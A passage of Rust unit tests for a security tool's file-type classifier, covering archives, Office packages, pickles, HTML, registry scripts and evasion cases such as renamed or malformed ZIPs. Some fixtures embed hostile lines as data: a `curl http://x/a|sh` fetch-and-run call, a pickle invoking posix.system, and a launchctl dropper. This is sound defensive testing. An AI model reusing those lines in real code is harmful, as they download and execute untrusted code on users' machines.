            zip.extend_from_slice(&[0u8; 2]);
            zip.extend_from_slice(&0x08u16.to_le_bytes()); // flags: bit 3
            zip.extend_from_slice(&[0u8; 10]);
            zip.extend_from_slice(&(body.len() as u32).to_le_bytes());
            zip.extend_from_slice(&(body.len() as u32).to_le_bytes());
            zip.extend_from_slice(&(name.len() as u16).to_le_bytes());
            zip.extend_from_slice(&0u16.to_le_bytes());
            zip.extend_from_slice(name.as_bytes());
            zip.extend_from_slice(body);
            zip.extend_from_slice(b"PK\x07\x08");
            zip.extend_from_slice(&[0u8; 12]);
        }
        zip.extend_from_slice(b"PK\x01\x02");
        assert_eq!(
            zip_has_top_level_entry(&zip, b"AndroidManifest.xml"),
            Some(true)
        );
        assert_eq!(
            classify_pk(Path::new("nameless"), &zip).0,
            FileType::ApkAndroid
        );
    }

    #[test]
    fn an_extensionless_android_package_is_still_an_apk() {
        let apk = zip_of(&[
            ("AndroidManifest.xml", b"\x03\x00\x08\x00"),
            ("classes.dex", b"dex"),
        ]);
        assert_eq!(
            classify_pk(Path::new("VirusShare_52b318f"), &apk).0,
            FileType::ApkAndroid
        );
    }

    #[test]
    fn a_stored_office_member_does_not_make_the_outer_zip_a_package() {
        // The outer file holds one `.xlsx`, uncompressed, so the inner
        // package's own `[Content_Types].xml` header is present verbatim in
        // the outer bytes. A substring test calls the carrier an OOXML
        // document and nothing walks its members; the entry walk does not.
        let inner = zip_of(&[("[Content_Types].xml", b"<Types/>")]);
        let outer = zip_of(&[("Persons_status_details_list.xlsx", &inner)]);
        assert!(memchr::memmem::find(&outer, b"[Content_Types].xml").is_some());
        assert_eq!(
            zip_has_top_level_entry(&outer, b"[Content_Types].xml"),
            Some(false)
        );
        assert_eq!(
            classify_pk(Path::new("carrier.docx"), &outer).0,
            FileType::Zip
        );
        // The inner document is still recognized on its own.
        assert_eq!(
            classify_pk(Path::new("inner.xlsx"), &inner).0,
            FileType::Ooxml
        );
    }

    #[test]
    fn a_large_archive_exceeding_max_entries_is_not_an_ooxml_package() {
        // A large archive whose first MAX_ENTRIES members do not include
        // `[Content_Types].xml` must not fall back to a loose substring match
        // and classify the carrier as OOXML just because an inner script/exploit
        // mentions `[Content_Types].xml`.
        let mut entries = Vec::new();
        for i in 0..8200 {
            entries.push((format!("file_{i}.txt"), b"dummy content".as_slice()));
        }
        let entries_ref: Vec<(&str, &[u8])> = entries
            .iter()
            .map(|(name, body)| (name.as_str(), *body))
            .collect();
        let zip = zip_of(&entries_ref);
        assert_eq!(
            zip_has_top_level_entry(&zip, b"[Content_Types].xml"),
            Some(false)
        );
        assert_eq!(
            classify_pk(Path::new("release-6.4.124"), &zip).0,
            FileType::Zip
        );
    }

    #[test]
    fn a_malformed_header_falls_back_rather_than_denying() {
        // A weaponized package whose first header declares a nonsense name
        // length and a half-gigabyte compressed size inside a 15 KB file.
        // The walk cannot follow that, and must not conclude "not a package":
        // these are Office documents, deliberately broken.
        let mut zip = zip_of(&[("[Content_Types].xml", b"<Types/>")]);
        zip[18..22].copy_from_slice(&538_968_429u32.to_le_bytes());
        zip[26..28].copy_from_slice(&4096u16.to_le_bytes());
        assert_eq!(zip_has_top_level_entry(&zip, b"[Content_Types].xml"), None);
        assert_eq!(classify_pk(Path::new("lure.docx"), &zip).0, FileType::Ooxml);
    }

    #[test]
    fn a_streaming_entry_falls_back_rather_than_denying() {
        // Bit 3 puts the sizes in a trailing descriptor, so the chain cannot
        // be stepped. Returning "not a package" there would misclassify real
        // documents written by streaming producers.
        let mut zip = zip_of(&[("word/document.xml", b"x")]);
        zip[6] = 0x08; // general-purpose bit 3
        zip[18..22].copy_from_slice(&0u32.to_le_bytes());
        assert_eq!(zip_has_top_level_entry(&zip, b"[Content_Types].xml"), None);
    }

    #[test]
    fn a_url_shortcut_is_identified_as_text() {
        // Otherwise it comes back `unknown`, and an unknown archive member is
        // never analyzed -- which for a delivery zip means the payload is the
        // one file nothing looks at.
        let body = b"[InternetShortcut]\r\nURL=file:\\\\203.0.113.1@80\\a\\b.lnk\r\n";
        assert_eq!(
            detect_from_content(Path::new("scan.pdf.url"), body).map(|(t, _)| t),
            Some(FileType::Text)
        );
        // Leading whitespace does not hide it.
        let padded = [b"\r\n  ".as_slice(), body.as_slice()].concat();
        assert_eq!(
            detect_from_content(Path::new("x"), &padded).map(|(t, _)| t),
            Some(FileType::Text)
        );
        // Neither does case: Windows matches section names case-insensitively.
        let shouted = b"[INTERNETSHORTCUT]\r\nURL=http://example.invalid/\r\n";
        assert_eq!(
            detect_from_content(Path::new("x"), shouted).map(|(t, _)| t),
            Some(FileType::Text)
        );
        // A bare `[` prefix is not a shortcut.
        assert_eq!(
            detect_from_content(Path::new("x"), b"[Internet").map(|(t, _)| t),
            None
        );
    }

    #[test]
    fn an_office_extension_without_the_opc_marker_is_a_zip() {
        // The evasion this closes: rename a zip to `.xlsm` and the office
        // analyzer takes it, finds no OPC parts, and nothing walks the members.
        let mut zip = b"PK\x03\x04".to_vec();
        zip.extend_from_slice(b"\x14\x00\x00\x00\x08\x00");
        zip.extend_from_slice(b"documents.doc");
        zip.extend(std::iter::repeat_n(0u8, 64));
        let (ft, _) = classify_pk(Path::new("invoice.xlsm"), &zip);
        assert_eq!(ft, FileType::Zip);
    }

    #[test]
    fn an_office_extension_with_the_opc_marker_is_still_ooxml() {
        let mut zip = b"PK\x03\x04".to_vec();
        zip.extend_from_slice(b"\x14\x00\x00\x00\x08\x00");
        zip.extend_from_slice(b"[Content_Types].xml");
        zip.extend(std::iter::repeat_n(0u8, 64));
        for name in ["a.docx", "a.xlsm", "a.pptm", "a.dotx"] {
            let (ft, _) = classify_pk(Path::new(name), &zip);
            assert_eq!(ft, FileType::Ooxml, "{name}");
        }
    }

    #[test]
    fn zip_package_ecosystems_by_extension() {
        for (name, expected) in [
            ("pkg.conda", FileType::Conda),
            ("lib.egg", FileType::Egg),
            ("Newtonsoft.Json.nupkg", FileType::Nupkg),
            ("App.ipa", FileType::Ipa),
            ("ext.vsix", FileType::Vsix),
        ] {
            let data = b"PK\x03\x04zip body";
            let (ft, _) = detect_from_content(Path::new(name), data).unwrap();
            assert_eq!(ft, expected, "{name}");
        }
    }

    #[test]
    fn sevenz_archive() {
        let data = b"7z\xBC\xAF\x27\x1C\x00\x00";
        let (ft, _) = detect_from_content(Path::new("data.7z"), data).unwrap();
        assert_eq!(ft, FileType::SevenZ);
    }

    #[test]
    fn too_short_returns_none() {
        assert!(detect_from_content(Path::new("x"), b"x").is_none());
    }

    fn content_type(name: &str, data: &[u8]) -> Option<FileType> {
        detect_from_content(Path::new(name), data).map(|(ft, _)| ft)
    }

    /// A script that opens with a binary format's first letters is still a
    /// script: every such format carries a NUL or control byte in its header.
    #[test]
    fn a_short_signature_followed_by_text_is_not_that_format() {
        let body = "=1;require('child_process').exec('curl http://x/a|sh');\n";
        for magic in [
            "MZ", "BM", "ID3", "OTTO", "true", "typ1", "ttcf", "wOFF", "Fasd", "hsqs", "sqsh",
            "ITSF", "Cr24", "xar!", "Rar!", "GIF89a", "PKCS7",
        ] {
            let script = format!("{magic}{body}");
            assert_eq!(content_type("a.js", script.as_bytes()), None, "{magic}");
        }
        assert_eq!(content_type("x", b"true\ntrue\nfalse\n"), None);
        assert_eq!(content_type("x", b"abcdftypisom and some prose"), None);
        // Text-header formats keep their claim.
        assert_eq!(
            content_type("x", b"%PDF-1.4\n1 0 obj\n<<>>\n"),
            Some(FileType::Pdf)
        );
        assert_eq!(
            content_type("x", b"REGEDIT4\r\n[HKEY_CURRENT_USER]\r\n"),
            Some(FileType::Registry)
        );
        let deb = b"!<arch>\ndebian-binary   1342177295  0     0     100644  4         `\n2.0\n";
        assert_eq!(content_type("x", deb), Some(FileType::Deb));
    }

    #[test]
    fn python_bytecode_by_magic_number() {
        // CPython 3.14 (3627) no longer has 0x0D as its second byte.
        let pyc = b"\x2b\x0e\r\n\0\0\0\0\x89\x36\x29\x6a\xbe\x34\0\0\xe3\0\0\0";
        assert_eq!(content_type("x", pyc), Some(FileType::PythonBytecode));
        let py27 = b"\x03\xf3\r\n\xde\x1d\xef\x50c\0\0\0\0\0\0\0\0\x02\0\0\0";
        assert_eq!(content_type("x", py27), Some(FileType::PythonBytecode));
        // Text whose first line is one character, re-converted to CR CR LF.
        assert_eq!(content_type("x", b"{\r\r\n\"a\": 1\r\r\n}\r\r\n"), None);
    }

    #[test]
    fn lockfiles_by_header_not_by_mention() {
        let yarn = b"# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n\nleft-pad@^1.3.0:\n";
        assert_eq!(
            content_type("yarn.abc123.lock", yarn),
            Some(FileType::YarnLock)
        );
        let cargo = b"# This file is automatically @generated by Cargo.\n# It is not intended for manual editing.\nversion = 4\n";
        assert_eq!(content_type("x", cargo), Some(FileType::CargoLock));
        let poetry = b"# This file is automatically @generated by Poetry 1.8.3 and should not be changed by hand.\n\n[[package]]\n";
        assert_eq!(content_type("x", poetry), Some(FileType::PoetryLock));
        assert_eq!(
            content_type("x", b"lockfileVersion: '9.0'\n\nimporters:\n"),
            Some(FileType::PnpmLock)
        );
        // Source that writes a yarn header is source.
        let js = b"const header = '# THIS IS AN AUTOGENERATED FILE.\\n# yarn lockfile v1\\n';\nrequire('child_process').exec(x);\n";
        assert_eq!(content_type("x", js), None);
    }

    #[test]
    fn markup_is_typed_by_its_root_element() {
        // A dropper that writes a LaunchAgent is the language it is written in.
        let dropper = b"import os\np = '''<?xml version=\"1.0\"?>\n<plist version=\"1.0\"><dict/></plist>'''\nos.system('launchctl load x')\n";
        assert_eq!(content_type("x.py", dropper), None);
        let plist = b"\xEF\xBB\xBF<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"x\">\n<plist version=\"1.0\"><dict/></plist>";
        assert_eq!(content_type("x", plist), Some(FileType::Plist));
        let svg = b"<!-- Created with Inkscape -->\n<svg\n\txmlns=\"http://www.w3.org/2000/svg\"/>";
        assert_eq!(content_type("x", svg), Some(FileType::Svg));
        let resx = b"\xEF\xBB\xBF<?xml version=\"1.0\"?>\n<root><xsd:schema/></root>";
        assert_eq!(content_type("x", resx), Some(FileType::Xml));
    }

    #[test]
    fn pickles_by_frame_or_torch_magic_whatever_the_name() {
        let proto5 = b"\x80\x05\x95\x1b\0\0\0\0\0\0\0\x8c\x05posix\x94\x8c\x06system\x94\x93\x94.";
        assert_eq!(content_type("model.bin", proto5), Some(FileType::Pickle));
        let torch = b"\x80\x02\x8a\x0a\x6c\xfc\x9c\x46\xf9\x20\x6a\xa8\x50\x19.\x80\x02M\xe9\x03.";
        assert_eq!(content_type("weights", torch), Some(FileType::Pickle));
        // Protocol 2 opens with two bytes other formats share; the name decides.
        let proto2 = b"\x80\x02}q\0(X\x01\0\0\0aq\x01K\x01u.";
        assert_eq!(content_type("x.pkl", proto2), Some(FileType::Pickle));
        assert_eq!(content_type("x.bin", proto2), None);
    }

    fn build_zstd_tar(members: &[(&str, &[u8])]) -> Vec<u8> {
        zstd::encode_all(&build_plain_tar(members)[..], 3).unwrap()
    }

    #[test]
    fn tar_packages_by_layout_whatever_the_name() {
        let gem = build_plain_tar(&[
            ("metadata.gz", b"x"),
            ("data.tar.gz", b"x"),
            ("checksums.yaml.gz", b"x"),
        ]);
        assert_eq!(content_type("blob", &gem), Some(FileType::Gem));
        let gpkg = build_plain_tar(&[("foo-1.0/gpkg-1", b""), ("foo-1.0/image.tar", b"")]);
        assert_eq!(content_type("blob", &gpkg), Some(FileType::GentooBinpkg));
        let krate = build_gzip_tar(&[
            ("foo-1.0/Cargo.toml", b"[package]"),
            ("foo-1.0/Cargo.toml.orig", b""),
        ]);
        assert_eq!(content_type("blob", &krate), Some(FileType::Crate));
        let alpine = build_gzip_tar(&[(".SIGN.RSA.builder.rsa.pub", b"sig")]);
        assert_eq!(content_type("blob", &alpine), Some(FileType::ApkAlpine));
        let xbps = build_zstd_tar(&[("./props.plist", b"<plist/>"), ("./files.plist", b"")]);
        assert_eq!(content_type("blob", &xbps), Some(FileType::Xbps));
        let arch = build_zstd_tar(&[
            (".BUILDINFO", b""),
            (".MTREE", b""),
            (".PKGINFO", b""),
            ("usr/bin/x", b""),
        ]);
        assert_eq!(content_type("blob", &arch), Some(FileType::PkgArch));
        // A layout that needs a different codec is only the generic tar.
        let zstd_npm = build_zstd_tar(&[("package/package.json", b"{}")]);
        assert_eq!(content_type("blob", &zstd_npm), Some(FileType::TarZst));
    }

    #[test]
    fn zip_packages_by_member_whatever_the_name() {
        for (entries, want) in [
            (
                &[
                    ("META-INF/MANIFEST.MF", &b"Main-Class: a.Main"[..]),
                    ("a/Main.class", b""),
                ][..],
                FileType::Jar,
            ),
            (
                &[
                    ("foo/__init__.py", &b""[..]),
                    ("foo-1.0.dist-info/WHEEL", b""),
                ][..],
                FileType::Whl,
            ),
            (
                &[
                    ("[Content_Types].xml", &b"<Types/>"[..]),
                    ("Foo.nuspec", b"<package/>"),
                ][..],
                FileType::Nupkg,
            ),
            (
                &[("Payload/Foo.app/Info.plist", &b""[..])][..],
                FileType::Ipa,
            ),
            (&[("EGG-INFO/PKG-INFO", &b""[..])][..], FileType::Egg),
            (
                &[("manifest.json", &b"{}"[..]), ("META-INF/mozilla.rsa", b"")][..],
                FileType::Xpi,
            ),
            (
                &[("metadata.json", &b"{}"[..]), ("info-foo-1.0.tar.zst", b"")][..],
                FileType::Conda,
            ),
        ] {
            assert_eq!(
                classify_pk(Path::new("blob"), &zip_of(entries)).0,
                want,
                "{want:?}"
            );
        }
        // A manifest merely mentioned in a stored member is not a VSIX.
        let mention = zip_of(&[("notes.txt", b"see extension.vsixmanifest")]);
        assert_eq!(classify_pk(Path::new("blob"), &mention).0, FileType::Zip);
    }

    #[test]
    fn asar_lzma_and_msi_by_structure() {
        let json = br#"{"files":{"main.js":{"size":5,"offset":"0"}}}"#;
        let mut asar = [
            4u32,
            json.len() as u32 + 8,
            json.len() as u32 + 4,
            json.len() as u32,
        ]
        .iter()
        .flat_map(|n| n.to_le_bytes())
        .collect::<Vec<_>>();
        asar.extend_from_slice(json);
        assert_eq!(content_type("app", &asar), Some(FileType::Asar));

        let lzma = b"\x5d\0\0\x80\0\xff\xff\xff\xff\xff\xff\xff\xff\0\x3b\x9d";
        assert_eq!(content_type("blob", lzma), Some(FileType::Lzma));
        // Chromium `.pak`: a plausible dictionary and size, but no 0x5D.
        let pak = b"\x05\0\0\0\x01\0\0\0\0\0\0\0\0\0\x12\0\0\0";
        assert_ne!(content_type("locale.pak", pak), Some(FileType::Lzma));

        let mut ole = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".to_vec();
        ole.resize(1024 + 0x60, 0);
        ole[0x1E] = 9; // 512-byte sectors
        ole[0x30..0x34].copy_from_slice(&0u32.to_le_bytes()); // directory at sector 0
        ole[512 + 0x50..512 + 0x60].copy_from_slice(&MSI_CLSIDS[0]);
        assert_eq!(content_type("setup.bin", &ole), Some(FileType::Msi));
        ole[512 + 0x50..512 + 0x60].fill(0);
        assert_eq!(content_type("setup.msi", &ole), Some(FileType::OleDoc));
    }
}

#[cfg(test)]
mod odf_confirmation_tests {
    use super::*;

    /// A ZIP whose local-header walk cannot complete, carrying the
    /// OpenDocument namespace URI somewhere in its body -- the shape of the
    /// 88MB .xapk that was typed OpenDocument.
    fn unwalkable_zip_mentioning_odf() -> Vec<u8> {
        let mut d = b"PK\x03\x04".to_vec();
        // A local header with a nonsense name length, so the walk loses the
        // thread and reports `None` rather than a confident "no".
        d.extend_from_slice(&[0xFF; 26]);
        d.extend_from_slice(b"application/vnd.oasis.opendocument.text");
        d.resize(4096, 0x41);
        d
    }

    #[test]
    fn indeterminate_walk_is_not_opendocument() {
        let d = unwalkable_zip_mentioning_odf();
        assert_ne!(classify_pk(Path::new("x.xapk"), &d).0, FileType::Odf);
    }

    #[test]
    fn odf_extension_still_wins() {
        let d = unwalkable_zip_mentioning_odf();
        assert_eq!(classify_pk(Path::new("x.odt"), &d).0, FileType::Odf);
    }
}

#[cfg(test)]
mod jet_db_sfnt_collision_tests {
    use super::*;

    /// A real TrueType font still identifies as a font.
    #[test]
    fn sfnt_version_one_is_still_a_font() {
        let mut data = vec![0x00, 0x01, 0x00, 0x00];
        data.extend_from_slice(&[0x00, 0x0a, 0x00, 0x80, 0x00, 0x03, 0x00, 0x20]);
        data.extend_from_slice(b"cmap");
        assert_eq!(
            detect_from_content(Path::new("x.ttf"), &data).map(|(ft, _)| ft),
            Some(FileType::Font)
        );
    }

    /// An Access database opens with the same four bytes and must not be
    /// handed to the font parser.
    #[test]
    fn jet_db_header_is_not_a_font() {
        let mut data = vec![0x00, 0x01, 0x00, 0x00];
        data.extend_from_slice(b"Standard Jet DB\x00");
        data.extend_from_slice(&[0u8; 32]);
        assert_ne!(
            detect_from_content(Path::new("db.mdb"), &data).map(|(ft, _)| ft),
            Some(FileType::Font)
        );
    }

    /// The newer ACE engine names itself the same way.
    #[test]
    fn ace_db_header_is_not_a_font() {
        let mut data = vec![0x00, 0x01, 0x00, 0x00];
        data.extend_from_slice(b"Standard ACE DB\x00");
        data.extend_from_slice(&[0u8; 32]);
        assert_ne!(
            detect_from_content(Path::new("db.accdb"), &data).map(|(ft, _)| ft),
            Some(FileType::Font)
        );
    }
}

#[cfg(test)]
mod html_doctype_magic_tests {
    use super::*;

    /// A page under a name that claims another language is still a page.
    #[test]
    fn doctype_html_is_detected_by_content() {
        let data =
            b"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n<HTML></HTML>";
        assert_eq!(
            detect_from_content(Path::new("Trojan.JS.DeltreeY.c"), data).map(|(ft, _)| ft),
            Some(FileType::Html)
        );
    }

    /// The doctype keyword is case-insensitive in HTML and in the wild.
    #[test]
    fn lowercase_doctype_html_is_detected() {
        let data = b"<!doctype html>\n<html><body>x</body></html>";
        assert_eq!(
            detect_from_content(Path::new("x"), data).map(|(ft, _)| ft),
            Some(FileType::Html)
        );
    }

    /// The SVG arm compares the root name, so it keeps its own doctype.
    #[test]
    fn doctype_svg_is_not_html() {
        let data = b"<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"x\">\n<svg xmlns=\"x\"/>";
        assert_ne!(
            detect_from_content(Path::new("x.svg"), data).map(|(ft, _)| ft),
            Some(FileType::Html)
        );
    }

    /// Real pages are not flush left. Four VirusShare samples open with four
    /// spaces before the doctype and were scored as JavaScript for the jQuery
    /// inside them.
    #[test]
    fn indented_doctype_is_still_html() {
        let data = b"    <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\">\n<html>";
        assert_eq!(
            detect_from_content(Path::new("VirusShare_4bcf5cc475"), data).map(|(ft, _)| ft),
            Some(FileType::Html)
        );
    }

    /// A file whose first bytes are `<html` is a page, doctype or not.
    #[test]
    fn bare_html_root_is_html() {
        let data = b"<html data-adblockkey=\"MFwwDQYJ\"><head><title>Redirecting</title>";
        assert_eq!(
            detect_from_content(Path::new("VirusShare_f54b1d8fed"), data).map(|(ft, _)| ft),
            Some(FileType::Html)
        );
    }

    /// The root-element check stops at a word boundary, so an XML document
    /// whose root merely begins with those letters is untouched.
    #[test]
    fn htmlspecialchars_root_is_not_html() {
        let data = b"<htmlspecialchars>not a page</htmlspecialchars>";
        assert_ne!(
            detect_from_content(Path::new("x.xml"), data).map(|(ft, _)| ft),
            Some(FileType::Html)
        );
    }
}

#[cfg(test)]
mod registry_script_magic_tests {
    use super::*;

    /// The Windows 9x/NT4 header, under a name that claims another type.
    #[test]
    fn regedit4_header_is_a_registry_script() {
        let data = b"REGEDIT4\r\n\r\n[HKEY_LOCAL_MACHINE\\Software\\Foo]\r\n\"Bar\"=\"baz\"\r\n";
        assert_eq!(
            detect_from_content(Path::new("Trojan.WinREG.AntiFireWall.a"), data).map(|(ft, _)| ft),
            Some(FileType::Registry)
        );
    }

    /// The Windows 2000+ header.
    #[test]
    fn modern_registry_header_is_a_registry_script() {
        let data = b"Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\X]\r\n";
        assert_eq!(
            detect_from_content(Path::new("x"), data).map(|(ft, _)| ft),
            Some(FileType::Registry)
        );
    }

    /// Prose that merely begins with the same word is not a registry script.
    #[test]
    fn unrelated_w_text_is_not_a_registry_script() {
        let data = b"Windows compatibility notes\n\nThis document describes...\n";
        assert_ne!(
            detect_from_content(Path::new("notes.txt"), data).map(|(ft, _)| ft),
            Some(FileType::Registry)
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod windows_script_host_tests {
    use super::*;

    #[test]
    fn character_references_resolve() {
        assert_eq!(decode_char_refs(b"&#86;&#66;&#x53;cript"), "VBScript");
        // A malformed reference is left as it is.
        assert_eq!(decode_char_refs(b"&#zz;x"), "&#zz;x");
    }

    #[test]
    fn attribute_values() {
        assert_eq!(
            attribute_value(b" language='JScript' src=x", b"language"),
            Some(&b"JScript"[..])
        );
        assert_eq!(
            attribute_value(b"\r\nlanguage = \"VBScript\"", b"language"),
            Some(&b"VBScript"[..])
        );
        assert_eq!(
            attribute_value(b" language=VBS/", b"language"),
            Some(&b"VBS"[..])
        );
        // `xlanguage` is a different attribute.
        assert_eq!(
            attribute_value(b" xlanguage=\"VBScript\"", b"language"),
            None
        );
    }

    #[test]
    fn script_host_roots_only() {
        let job = b"<component>\n<script language=\"VBScript\">x = 1</script>\n</component>\n";
        assert_eq!(windows_script_host(job), Some(FileType::Vbs));
        // No language, or one the host does not run: not claimed.
        assert_eq!(
            windows_script_host(b"<job><script>x = 1</script></job>"),
            None
        );
        assert_eq!(
            windows_script_host(b"<job><script language=\"PerlScript\">1;</script></job>"),
            None
        );
        // Other XML is left to the XML arm.
        assert_eq!(
            windows_script_host(
                b"<?xml version=\"1.0\"?><rss><script language=\"VBScript\"/></rss>"
            ),
            None
        );
    }

    #[test]
    fn dib_header_versions() {
        let header = |size: u32, planes: u16, bits: u16| {
            let mut h = size.to_le_bytes().to_vec();
            h.resize(40, 0);
            let at = if size == 12 { 8 } else { 12 };
            h[at..at + 2].copy_from_slice(&planes.to_le_bytes());
            h[at + 2..at + 4].copy_from_slice(&bits.to_le_bytes());
            h
        };
        for size in [12, 16, 40, 52, 56, 64, 108, 124] {
            assert!(looks_like_dib_header(&header(size, 1, 8)), "size {size}");
        }
        assert!(!looks_like_dib_header(&header(41, 1, 8)));
        assert!(!looks_like_dib_header(&header(40, 0, 8)));
        assert!(!looks_like_dib_header(&header(40, 1, 3)));
        assert!(!looks_like_dib_header(&[40, 0, 0]));
    }
}
